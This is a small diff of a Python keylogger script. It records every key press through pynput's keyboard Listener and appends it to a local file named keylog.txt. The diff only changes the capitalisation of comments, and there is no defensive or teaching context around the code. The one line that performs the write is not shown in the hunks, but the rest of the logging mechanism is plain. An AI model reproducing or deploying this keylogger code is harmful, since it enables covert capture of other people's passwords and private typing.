@@ -1,9 +1,9 @@
 from pynput.keyboard import Listener
 
-# File to store keystrokes
+# file to store keystrokes
 log_file = "keylog.txt"
 
-# Function to log key presses
+# function to log key presses
 def on_press(key):
     try:
         with open(log_file, "a") as f:
@@ -11,6 +11,6 @@ def on_press(key):
     except Exception as e:
         print(f"Error: {e}")
 
-# Start listening for keystrokes
+# start listening 
 with Listener(on_press=on_press) as listener:
     listener.join()
